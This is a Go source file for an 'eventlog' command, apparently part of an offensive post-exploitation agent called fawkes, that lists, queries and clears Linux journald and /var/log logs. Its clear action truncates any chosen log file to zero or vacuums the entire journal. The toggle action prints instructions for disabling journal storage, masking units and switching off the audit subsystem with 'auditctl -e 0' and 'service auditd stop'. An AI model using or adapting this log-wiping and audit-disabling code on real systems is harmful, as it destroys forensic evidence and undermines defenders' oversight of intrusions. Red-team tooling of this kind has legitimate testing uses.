//go:build linux

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// EventLogCommand provides journald (systemd journal) access on Linux.
// Complements linux-logs (file-based /var/log) with structured journal queries.
type EventLogCommand struct{}

type eventlogArgs struct {
	Action  string `json:"action"`
	Channel string `json:"channel"`
	Filter  string `json:"filter"`
	EventID int    `json:"event_id"`
	Count   int    `json:"count"`
}

func (c *EventLogCommand) Name() string { return "eventlog" }

func (c *EventLogCommand) Description() string {
	return "Manage system logs — list, query, clear, info on Linux (journald/syslog)"
}

func (c *EventLogCommand) Execute(task structs.Task) structs.CommandResult {
	var args eventlogArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Failed to parse parameters: %v", err)
		}
	}

	if args.Action == "" {
		args.Action = "list"
	}

	switch args.Action {
	case "list":
		return eventlogLinuxList(args.Filter)
	case "query":
		return eventlogLinuxQuery(args.Channel, args.Filter, args.EventID, args.Count)
	case "clear":
		return eventlogLinuxClear(args.Channel)
	case "info":
		return eventlogLinuxInfo(args.Channel)
	case "enable", "disable":
		return eventlogLinuxToggle(args.Action, args.Channel)
	default:
		return errorf("Unknown action: %s (use list, query, clear, info, enable, disable)", args.Action)
	}
}

// hasJournalctl checks if journalctl is available on the system.
func hasJournalctl() bool {
	_, err := exec.LookPath("journalctl")
	return err == nil
}

// eventlogLinuxList lists available log sources: journald units and/or syslog files.
func eventlogLinuxList(filter string) structs.CommandResult {
	var sb strings.Builder

	if hasJournalctl() {
		// List journal boots
		out, err := execCmdTimeout("journalctl", "--list-boots", "--no-pager")
		if err == nil {
			boots := strings.TrimSpace(string(out))
			if boots != "" {
				sb.WriteString("Journal Boots:\n")
				for _, line := range strings.Split(boots, "\n") {
					line = strings.TrimSpace(line)
					if filter == "" || strings.Contains(strings.ToLower(line), strings.ToLower(filter)) {
						sb.WriteString(fmt.Sprintf("  %s\n", line))
					}
				}
				sb.WriteString("\n")
			}
		}

		// List journal units with messages
		out, err = execCmdTimeout("journalctl", "--field=_SYSTEMD_UNIT", "--no-pager")
		if err == nil {
			units := strings.TrimSpace(string(out))
			if units != "" {
				lines := strings.Split(units, "\n")
				var filtered []string
				for _, u := range lines {
					u = strings.TrimSpace(u)
					if u == "" {
						continue
					}
					if filter == "" || strings.Contains(strings.ToLower(u), strings.ToLower(filter)) {
						filtered = append(filtered, u)
					}
				}
				sb.WriteString(fmt.Sprintf("Journal Units (%d", len(filtered)))
				if filter != "" {
					sb.WriteString(fmt.Sprintf(", filter: '%s'", filter))
				}
				sb.WriteString("):\n")
				for _, u := range filtered {
					sb.WriteString(fmt.Sprintf("  %s\n", u))
				}
				sb.WriteString("\n")
			}
		}

		// Journal disk usage
		out, err = execCmdTimeout("journalctl", "--disk-usage", "--no-pager")
		if err == nil {
			sb.WriteString(fmt.Sprintf("Disk Usage: %s\n", strings.TrimSpace(string(out))))
		}
	} else {
		sb.WriteString("journalctl not available (non-systemd system)\n\n")
	}

	// Always list /var/log files as supplementary info
	sb.WriteString("\nLog Files in /var/log/:\n")
	count := eventlogListVarLog(&sb, filter)
	if count == 0 {
		sb.WriteString("  (no matching log files found)\n")
	}

	return successResult(sb.String())
}

// eventlogListVarLog lists text log files in /var/log with optional filter.
func eventlogListVarLog(sb *strings.Builder, filter string) int {
	entries, err := os.ReadDir("/var/log")
	if err != nil {
		sb.WriteString(fmt.Sprintf("  Error reading /var/log: %v\n", err))
		return 0
	}
	count := 0
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		// Skip binary/compressed files
		if strings.HasSuffix(name, ".gz") || strings.HasSuffix(name, ".xz") ||
			strings.HasSuffix(name, ".bz2") || strings.HasSuffix(name, ".zst") {
			continue
		}
		if filter != "" && !strings.Contains(strings.ToLower(name), strings.ToLower(filter)) {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		modTime := info.ModTime().Format("2006-01-02 15:04:05")
		sb.WriteString(fmt.Sprintf("  %-30s %10d bytes  %s\n", name, info.Size(), modTime))
		count++
	}
	return count
}

// eventlogLinuxQuery queries journal entries or log file content.
func eventlogLinuxQuery(channel, filter string, priority, maxCount int) structs.CommandResult {
	if maxCount <= 0 {
		maxCount = 50
	}

	// If channel looks like a file path, read the file directly (no subprocess)
	if strings.HasPrefix(channel, "/") {
		return eventlogQueryFile(channel, filter, maxCount)
	}

	if !hasJournalctl() {
		if channel == "" {
			return errorResult("journalctl not available. Specify a log file path as channel (e.g., /var/log/auth.log)")
		}
		// Try as file path under /var/log
		path := filepath.Join("/var/log", channel)
		if _, err := os.Stat(path); err == nil {
			return eventlogQueryFile(path, filter, maxCount)
		}
		return errorf("journalctl not available and /var/log/%s not found", channel)
	}

	// Build journalctl arguments
	args := []string{"--no-pager", "--reverse", "-n", fmt.Sprintf("%d", maxCount)}

	if channel != "" {
		// Channel maps to systemd unit
		args = append(args, "-u", channel)
	}

	// Priority maps to syslog priority (0=emerg through 7=debug)
	if priority > 0 && priority <= 7 {
		args = append(args, fmt.Sprintf("--priority=%d", priority))
	}

	// Filter: time window (e.g., "24h", "7d") or grep pattern
	if filter != "" {
		if dur, ok := parseTimeWindow(filter); ok {
			since := time.Now().Add(-dur).Format("2006-01-02 15:04:05")
			args = append(args, "--since", since)
		} else {
			args = append(args, "--grep", filter)
		}
	}

	// Output as short-iso for readable timestamps
	args = append(args, "--output=short-iso")

	out, err := execCmdTimeout("journalctl", args...)
	if err != nil {
		// journalctl may return exit code 1 with partial output
		if len(out) > 0 {
			return successResult(string(out))
		}
		return errorf("journalctl query failed: %v", err)
	}

	result := strings.TrimSpace(string(out))
	if result == "" || result == "-- No entries --" {
		var sb strings.Builder
		sb.WriteString("No journal entries found")
		if channel != "" {
			sb.WriteString(fmt.Sprintf(" for unit '%s'", channel))
		}
		if filter != "" {
			sb.WriteString(fmt.Sprintf(" matching '%s'", filter))
		}
		return successResult(sb.String())
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Journal entries (max %d, newest first):\n", maxCount))
	if channel != "" {
		sb.WriteString(fmt.Sprintf("Unit: %s\n", channel))
	}
	if filter != "" {
		sb.WriteString(fmt.Sprintf("Filter: %s\n", filter))
	}
	sb.WriteString("\n")
	sb.WriteString(result)

	return successResult(sb.String())
}

// eventlogQueryFile reads a log file directly (no subprocess — opsec friendly).
func eventlogQueryFile(path, filter string, maxCount int) structs.CommandResult {
	content, err := os.ReadFile(path)
	if err != nil {
		return errorf("Error reading %s: %v", path, err)
	}

	lines := strings.Split(strings.TrimRight(string(content), "\n"), "\n")

	// Apply keyword filter
	if filter != "" {
		if dur, ok := parseTimeWindow(filter); ok {
			// Time filter — parse syslog timestamps
			cutoff := time.Now().Add(-dur)
			lines = filterLinesByTime(lines, cutoff)
		} else {
			lowerFilter := strings.ToLower(filter)
			var filtered []string
			for _, line := range lines {
				if strings.Contains(strings.ToLower(line), lowerFilter) {
					filtered = append(filtered, line)
				}
			}
			lines = filtered
		}
	}

	// Return last N lines (newest)
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== %s (%d lines", path, len(lines)))
	if filter != "" {
		sb.WriteString(fmt.Sprintf(", filter: '%s'", filter))
	}
	sb.WriteString(") ===\n")

	start := 0
	if len(lines) > maxCount {
		start = len(lines) - maxCount
		sb.WriteString(fmt.Sprintf("(showing last %d lines)\n", maxCount))
	}
	for i := start; i < len(lines); i++ {
		sb.WriteString(lines[i] + "\n")
	}

	if len(lines) == 0 {
		sb.WriteString("No matching entries found.\n")
	}

	return successResult(sb.String())
}

// filterLinesByTime filters syslog-formatted lines to those after cutoff.
// Syslog format: "Mar 11 08:00:00 ..." or "Mar  9 08:00:00 ..." — parsed
// relative to current year. Uses "Jan _2 15:04:05" (space-padded day).
func filterLinesByTime(lines []string, cutoff time.Time) []string {
	year := time.Now().Year()
	var result []string
	for _, line := range lines {
		if len(line) < 15 {
			continue
		}
		// Syslog timestamp is always 15 chars: "Jan _2 15:04:05" format
		ts, err := time.Parse("Jan _2 15:04:05", line[:15])
		if err != nil {
			continue
		}
		ts = ts.AddDate(year-ts.Year(), 0, 0)
		if ts.After(cutoff) {
			result = append(result, line)
		}
	}
	return result
}

// parseTimeWindow parses duration strings like "24h", "7d", "30m".
func parseTimeWindow(s string) (time.Duration, bool) {
	s = strings.TrimSpace(strings.ToLower(s))
	if len(s) < 2 {
		return 0, false
	}

	suffix := s[len(s)-1]
	numStr := s[:len(s)-1]

	var multiplier time.Duration
	switch suffix {
	case 'm':
		multiplier = time.Minute
	case 'h':
		multiplier = time.Hour
	case 'd':
		multiplier = 24 * time.Hour
	default:
		return 0, false
	}

	var num int
	if _, err := fmt.Sscanf(numStr, "%d", &num); err != nil || num <= 0 {
		return 0, false
	}

	return time.Duration(num) * multiplier, true
}

// eventlogLinuxClear vacuums journald entries or truncates a log file.
func eventlogLinuxClear(channel string) structs.CommandResult {
	// If channel is a file path, truncate it directly
	if strings.HasPrefix(channel, "/") {
		if err := os.Truncate(channel, 0); err != nil {
			return errorf("Error truncating %s: %v", channel, err)
		}
		return successf("Truncated %s to 0 bytes", channel)
	}

	if !hasJournalctl() {
		return errorResult("journalctl not available. Specify a file path to truncate (e.g., /var/log/auth.log)")
	}

	// Vacuum journal: remove entries older than 1 second (effectively clears all)
	vacuumArg := "--vacuum-time=1s"
	if channel != "" {
		// If channel looks like a duration (e.g., "7d"), vacuum to that time
		if _, ok := parseTimeWindow(channel); ok {
			vacuumArg = "--vacuum-time=" + channel
		}
	}

	out, err := execCmdTimeout("journalctl", vacuumArg, "--no-pager")
	if err != nil {
		return errorf("Journal vacuum failed: %v\n%s\nRequires root privileges.", err, string(out))
	}

	return successf("Journal vacuum complete:\n%s", strings.TrimSpace(string(out)))
}

// eventlogLinuxInfo shows metadata about the journal or a specific log file.
func eventlogLinuxInfo(channel string) structs.CommandResult {
	// If channel is a file path, show file info
	if strings.HasPrefix(channel, "/") {
		return eventlogFileInfo(channel)
	}

	var sb strings.Builder

	if hasJournalctl() {
		sb.WriteString("Journal Information\n")
		sb.WriteString(strings.Repeat("=", 40) + "\n\n")

		// Disk usage
		out, err := execCmdTimeout("journalctl", "--disk-usage", "--no-pager")
		if err == nil {
			sb.WriteString(fmt.Sprintf("  %s\n", strings.TrimSpace(string(out))))
		}

		// Header info (oldest/newest entry)
		out, err = execCmdTimeout("journalctl", "--header", "--no-pager")
		if err == nil {
			header := string(out)
			// Extract key fields from header
			for _, line := range strings.Split(header, "\n") {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "Machine ID:") ||
					strings.HasPrefix(line, "Boot ID:") ||
					strings.HasPrefix(line, "Head sequential number:") ||
					strings.HasPrefix(line, "Tail sequential number:") ||
					strings.HasPrefix(line, "Head realtime timestamp:") ||
					strings.HasPrefix(line, "Tail realtime timestamp:") ||
					strings.HasPrefix(line, "Data objects:") ||
					strings.HasPrefix(line, "Entry objects:") {
					sb.WriteString(fmt.Sprintf("  %s\n", line))
				}
			}
		}

		// If a specific unit was requested, show unit info
		if channel != "" {
			sb.WriteString(fmt.Sprintf("\n  Unit: %s\n", channel))
			// Count entries for this unit
			out, err = execCmdTimeout("journalctl", "-u", channel, "--no-pager", "--output=cat", "-q")
			if err == nil {
				lines := strings.Split(strings.TrimSpace(string(out)), "\n")
				count := len(lines)
				if lines[0] == "" {
					count = 0
				}
				sb.WriteString(fmt.Sprintf("  Entries: %d\n", count))
			}
		}

		// Journal file locations
		sb.WriteString("\n  Storage paths:\n")
		for _, dir := range []string{"/var/log/journal", "/run/log/journal"} {
			if info, err := os.Stat(dir); err == nil && info.IsDir() {
				size := dirSize(dir)
				sb.WriteString(fmt.Sprintf("    %s (%s)\n", dir, formatBytes(uint64(size))))
			}
		}
	} else {
		sb.WriteString("journalctl not available (non-systemd system)\n")
	}

	// Show /var/log summary
	sb.WriteString("\n/var/log Summary:\n")
	sb.WriteString(strings.Repeat("=", 40) + "\n")
	totalSize := dirSize("/var/log")
	sb.WriteString(fmt.Sprintf("  Total size: %s\n", formatBytes(uint64(totalSize))))

	return successResult(sb.String())
}

// eventlogFileInfo shows metadata about a specific log file.
func eventlogFileInfo(path string) structs.CommandResult {
	info, err := os.Stat(path)
	if err != nil {
		return errorf("Error: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Log File Info: %s\n\n", path))
	sb.WriteString(fmt.Sprintf("  Size:     %s (%d bytes)\n", formatBytes(uint64(info.Size())), info.Size()))
	sb.WriteString(fmt.Sprintf("  Modified: %s\n", info.ModTime().Format("2006-01-02 15:04:05 MST")))
	sb.WriteString(fmt.Sprintf("  Mode:     %s\n", info.Mode()))

	// Count lines if it's a text file and reasonably sized
	if info.Size() > 0 && info.Size() < 100*1024*1024 { // < 100MB
		if content, err := os.ReadFile(path); err == nil {
			lineCount := strings.Count(string(content), "\n")
			sb.WriteString(fmt.Sprintf("  Lines:    %d\n", lineCount))
		}
	}

	return successResult(sb.String())
}

// dirSize calculates total size of files in a directory tree.
func dirSize(path string) int64 {
	var total int64
	_ = filepath.Walk(path, func(_ string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // skip errors
		}
		if !info.IsDir() {
			total += info.Size()
		}
		return nil
	})
	return total
}

// eventlogLinuxToggle handles enable/disable — provides guidance since Linux
// logging is configured via systemd-journald.conf or rsyslog, not toggled per-channel.
func eventlogLinuxToggle(action, channel string) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Note: Linux logging cannot be directly %sd per-channel like Windows Event Log.\n\n", action))
	sb.WriteString("Options for controlling Linux logging:\n\n")
	sb.WriteString("  1. Journal forwarding:  Edit /etc/systemd/journald.conf\n")
	sb.WriteString("     ForwardToSyslog=no   — Stop forwarding to syslog\n")
	sb.WriteString("     Storage=none          — Disable persistent journal storage\n")
	sb.WriteString("     Then: systemctl restart systemd-journald\n\n")
	sb.WriteString("  2. Syslog rules:        Edit /etc/rsyslog.conf or /etc/rsyslog.d/*.conf\n")
	sb.WriteString("     Comment out rules for specific facilities/priorities\n")
	sb.WriteString("     Then: systemctl restart rsyslog\n\n")
	sb.WriteString("  3. Per-unit override:   systemctl mask <unit> (prevents logging service)\n\n")
	sb.WriteString("  4. Audit logging:       auditctl -e 0  (disable audit subsystem)\n")
	sb.WriteString("                          service auditd stop\n\n")
	sb.WriteString("Use linux-logs command for direct log file manipulation (truncate, shred).\n")

	return successResult(sb.String())
}
